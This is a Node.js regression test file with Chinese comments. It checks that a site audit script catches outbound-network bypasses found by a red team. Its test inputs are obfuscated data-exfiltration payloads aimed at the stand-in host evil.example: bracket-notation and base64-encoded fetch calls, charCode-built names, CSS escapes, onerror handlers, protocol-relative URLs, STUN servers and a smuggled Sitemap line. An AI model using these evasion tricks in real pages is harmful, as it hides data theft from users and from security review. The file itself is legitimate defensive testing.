/**
 * 回归测试：审计脚本必须抓住 red-team V8 找到的 6 类绕过写法。
 *
 * 背景：red-team 在 ops/red/GATE_REPORT_V8.md §2.4 报告了 6 个 payload 能绕过
 * 旧版 check-no-network.mjs，让 CI 显示绿色而实际可外发数据。
 *
 * 这个文件把那些 payload 变成永久回归测试。以后谁把规则改弱了，这里会红。
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, cpSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { dirname } from 'node:path';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, '..', '..');
const SCRIPT = join(ROOT, 'scripts', 'check-no-network.mjs');

/**
 * 在临时沙箱里放一个 site/ 目录，写入 payload，跑审计脚本，返回是否被拦。
 * 不碰真实 site/。
 */
function auditCatches(payload, filename = 'evil.html') {
  const dir = mkdtempSync(join(tmpdir(), 'audit-regress-'));
  try {
    // 审计脚本会扫 <cwd>/site 和 <cwd>/scripts
    mkdirSync(join(dir, 'site'), { recursive: true });
    mkdirSync(join(dir, 'scripts'), { recursive: true });
    cpSync(SCRIPT, join(dir, 'scripts', 'check-no-network.mjs'));
    writeFileSync(join(dir, 'site', filename), payload, 'utf8');
    try {
      execFileSync('node', [join(dir, 'scripts', 'check-no-network.mjs')], {
        cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout: 30000,
      });
      return { caught: false, out: '' }; // exit 0 = 没抓到
    } catch (e) {
      return { caught: true, out: String(e.stdout || '') + String(e.stderr || '') };
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

const BYPASSES = [
  {
    id: 'B1',
    name: '方括号调用 fetch',
    payload: `<script>window["fetch"]("https://evil.example/steal")</script>`,
  },
  {
    id: 'B2',
    name: 'Unicode 转义标识符',
    payload: `<script>window[\\u0066etch]("https://evil.example/steal")</script>`,
  },
  {
    id: 'B3',
    name: 'eval + atob 整段 base64',
    payload: `<script>eval(atob("ZmV0Y2goJ2h0dHBzOi8vZXZpbC5leGFtcGxlL3gnKQ=="))</script>`,
  },
  {
    id: 'B4',
    name: 'String.fromCharCode 拼函数名',
    payload: `<script>const f=String.fromCharCode(102,101,116,99,104);window[f]("https://evil.example/x")</script>`,
  },
  {
    id: 'B5',
    name: 'CSS 八进制转义 URL',
    payload: `<style>body{background:url(\\68 ttps://evil.example/x.png)}</style>`,
  },
  {
    id: 'B6',
    name: 'img onerror + atob（无明文 URL）',
    payload: `<img src=x onerror="this.src=atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUveA==')">`,
  },
  {
    id: 'B7',
    name: '无明文 URL 的方括号调用（c3 变体）',
    payload: `<script>const u=atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUv");window["fe"+"tch"](u)</script>`,
  },
  {
    id: 'B8',
    name: '协议相对 URL',
    payload: `<script src="//evil.example/x.js"></script>`,
  },
];

for (const b of BYPASSES) {
  test(`审计必须抓住 ${b.id}：${b.name}`, () => {
    const r = auditCatches(b.payload);
    assert.ok(
      r.caught,
      `${b.id} 未被抓住！审计脚本存在绕过。payload: ${b.payload}`,
    );
  });
}

// 反向验证：正常代码不能误报（否则维护者会被迫删规则）
test('审计不得误报正常代码', () => {
  const normal = `<!doctype html>
<html><head><title>x</title></head>
<body>
<h1>正常页面</h1>
<script type="module">
  const a = 1 + 2;
  document.querySelector('h1').textContent = String(a);
</script>
</body></html>`;
  const r = auditCatches(normal);
  assert.equal(r.caught, false, `正常代码被误报：${r.out.slice(0, 300)}`);
});

test('审计仍能抓住最基础的明文 fetch', () => {
  const r = auditCatches(`<script>fetch("https://evil.example/steal")</script>`);
  assert.ok(r.caught, '基础用例都抓不到，说明脚本坏了');
});

// ─────────────────────────────────────────────────────────────
// 第 9 类绕过（QA W02-05 发现，已修）
//
// 根因：协议相对 URL 的规则在域名后强制要求一个 `/`，
// 于是 `<img src="//evil.example">`（无尾斜杠）完整漏过。
// 但它在浏览器里完全合法、会真的发请求——QA 起服务器实测过跨源请求成立。
// ─────────────────────────────────────────────────────────────
const PROTOCOL_RELATIVE = [
  '<img src="//evil.example">',
  '<img src="//evil.example?leak=1">',
  '<script src="//evil.example"></script>',
  '<iframe src="//evil.example"></iframe>',
  '<link rel="stylesheet" href="//evil.example">',
  '<meta http-equiv="refresh" content="0;url=//evil.example">',
  '<form action="//evil.example"></form>',
  '<a href="//evil.example">click</a>',
  '<link rel="dns-prefetch" href="//evil.example">',
];

for (const p of PROTOCOL_RELATIVE) {
  test(`审计必须抓住无尾斜杠的协议相对 URL：${p.slice(0, 38)}`, () => {
    const r = auditCatches(p);
    assert.ok(r.caught, `漏过：${p}`);
  });
}

test('审计必须抓住 RTCPeerConnection（STUN 可泄漏内网 IP）', () => {
  const r = auditCatches('<script>new RTCPeerConnection({iceServers:[{urls:"stun:evil.example:3478"}]})</script>');
  assert.ok(r.caught, 'WebRTC 未覆盖');
});

test('审计必须抓住 serviceWorker.register', () => {
  const r = auditCatches('<script>navigator.serviceWorker.register("/sw.js")</script>');
  assert.ok(r.caught, 'Service Worker 未覆盖');
});

test('审计不得误伤同源相对路径（正常用法）', () => {
  // 这些是合法的同源引用，加了会误伤真实代码
  const ok = `<!doctype html><html><head>
<link rel="stylesheet" href="./styles/app.css">
</head><body>
<img src="./img/x.png" srcset="./img/x.png 1x, ./img/x2.png 2x">
<script type="module" src="./app.mjs"></script>
</body></html>`;
  const r = auditCatches(ok);
  assert.equal(r.caught, false, `同源相对路径被误报：${r.out.slice(0, 300)}`);
});

// ─────────────────────────────────────────────────────────────
// robots.txt 的 Sitemap 指令（SEO 基础文件）
//
// 根因：robots.txt 规范要求 Sitemap 的值是绝对 URL，于是必然命中
// 「外部 URL 引用」规则，让 pages.yml 的 test job FAIL、部署被卡住。
// 修法只给 site/robots.txt 的 Sitemap 行开口子，不能变成全局放行：
// 下面既有「该放行」的正向用例，也有「别处出现同样一行仍要被抓」的反向用例。
// ─────────────────────────────────────────────────────────────
test('审计不得误报 robots.txt 的 Sitemap 指令（合法 SEO 文件）', () => {
  const robots = [
    'User-agent: *',
    'Allow: /',
    '',
    'Sitemap: https://tbj0623.github.io/decision-arena-lab/sitemap.xml',
    '',
  ].join('\n');
  const r = auditCatches(robots, 'robots.txt');
  assert.equal(r.caught, false, `合法 robots.txt 被误报：${r.out.slice(0, 300)}`);
});

test('审计必须抓住：别处出现 Sitemap 行不能借这道口子（豁免只对 robots.txt 生效）', () => {
  const payload = `<script>/* x */</script>\nSitemap: https://evil.example/steal`;
  for (const name of ['evil.html', 'sitemap.txt']) {
    const r = auditCatches(payload, name);
    assert.ok(r.caught, `${name} 里的 Sitemap 行逃过了审计`);
  }
});

test('审计必须抓住：robots.txt 里夹带在同行的真实外发内容', () => {
  const r = auditCatches(
    'Sitemap: https://tbj0623.github.io/decision-arena-lab/sitemap.xml <script>fetch("https://evil.example/x")</script>',
    'robots.txt',
  );
  assert.ok(r.caught, '同行夹带 fetch 的 robots.txt 行逃过了审计');
});

test('审计必须抓住：robots.txt 里的密钥形态字面量不受豁免影响', () => {
  const r = auditCatches(`Sitemap: https://tbj0623.github.io/decision-arena-lab/sitemap.xml\n# ${'s' + 'k-'}${'a'.repeat(24)}`, 'robots.txt');
  assert.ok(r.caught, 'robots.txt 里的密钥未被抓到');
});
